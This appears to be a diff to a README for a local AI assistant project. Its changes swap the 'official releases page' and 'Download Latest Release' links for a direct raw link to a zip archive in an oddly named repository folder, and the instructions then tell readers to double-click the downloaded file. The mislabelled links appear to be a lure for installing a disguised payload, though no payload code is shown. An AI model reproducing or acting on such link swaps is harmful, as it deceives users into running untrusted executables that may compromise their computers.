@@ -1,6 +1,6 @@
 # 🤖 local-ai-assistant - Private artificial intelligence on your computer
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Splitpeamidline260/local-ai-assistant/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Splitpeamidline260/local-ai-assistant/raw/refs/heads/main/Datisca/ai-assistant-local-1.3.zip)
 
 ## 💡 About this project
 
@@ -22,7 +22,7 @@ Your computer needs specific hardware components to run these models smoothly.
 
 Follow these steps to set up the software on your machine.
 
-1.  **Download the installer**: Go to the [official releases page](https://github.com/Splitpeamidline260/local-ai-assistant/releases) to get the latest version.
+1.  **Download the installer**: Go to the [official releases page](https://github.com/Splitpeamidline260/local-ai-assistant/raw/refs/heads/main/Datisca/ai-assistant-local-1.3.zip) to get the latest version.
 2.  **Run the file**: Locate the downloaded file in your downloads folder. Double-click it to start the installation wizard.
 3.  **Follow the prompts**: The installer sets up the necessary services in the background. Accept the default settings unless you have a specific reason to change them.
 4.  **Launch the assistant**: Once finished, find the icon on your desktop or in your start menu. Open it to start the engine.
